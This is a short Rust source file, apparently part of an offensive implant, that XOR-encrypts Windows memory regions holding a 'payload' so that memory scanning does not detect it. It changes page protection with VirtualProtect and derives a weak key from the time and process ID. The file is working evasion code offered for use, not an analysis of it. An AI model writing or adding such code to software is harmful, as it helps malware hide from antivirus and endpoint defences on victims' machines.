// Heap Encryption
// Encrypts memory regions to prevent memory scanning

use winapi::um::winnt::*;
use winapi::um::memoryapi::*;
use winapi::shared::minwindef::*;
use std::ptr;

/// Encrypt a memory region
pub unsafe fn encrypt_heap_region(
    address: *mut u8,
    size: usize,
    key: &[u8],
) -> Result<(), String> {
    if address.is_null() || size == 0 {
        return Err("Invalid parameters".to_string());
    }
    
    // Change memory protection to read-write
    let mut old_protect = 0u32;
    if VirtualProtect(
        address as *mut _,
        size,
        PAGE_READWRITE,
        &mut old_protect,
    ) == 0 {
        return Err(format!("Failed to change memory protection: {}", GetLastError()));
    }
    
    // XOR encrypt the region
    let key_len = key.len();
    if key_len == 0 {
        return Err("Invalid key".to_string());
    }
    
    for i in 0..size {
        *address.add(i) ^= key[i % key_len];
    }
    
    // Restore protection
    let mut _dummy = 0u32;
    VirtualProtect(
        address as *mut _,
        size,
        old_protect,
        &mut _dummy,
    );
    
    Ok(())
}

/// Decrypt a memory region
pub unsafe fn decrypt_heap_region(
    address: *mut u8,
    size: usize,
    key: &[u8],
) -> Result<(), String> {
    // Decryption is the same as encryption for XOR
    encrypt_heap_region(address, size, key)
}

/// Generate a random key for heap encryption
pub fn generate_heap_key() -> [u8; 32] {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    use winapi::um::processthreadsapi::GetCurrentProcessId;
    
    // Generate key based on current time and process ID
    let mut hasher = DefaultHasher::new();
    std::time::SystemTime::now().hash(&mut hasher);
    unsafe {
        GetCurrentProcessId().hash(&mut hasher);
    }
    
    let hash = hasher.finish();
    let mut key = [0u8; 32];
    
    // Fill key with hash bytes (repeated)
    for i in 0..32 {
        key[i] = ((hash >> (i % 8 * 8)) & 0xFF) as u8;
    }
    
    key
}

/// Encrypt heap containing payload
pub unsafe fn encrypt_payload_heap(
    payload_address: *mut u8,
    payload_size: usize,
) -> Result<[u8; 32], String> {
    let key = generate_heap_key();
    encrypt_heap_region(payload_address, payload_size, &key)?;
    Ok(key)
}

/// Decrypt heap containing payload
pub unsafe fn decrypt_payload_heap(
    payload_address: *mut u8,
    payload_size: usize,
    key: &[u8],
) -> Result<(), String> {
    decrypt_heap_region(payload_address, payload_size, key)
}
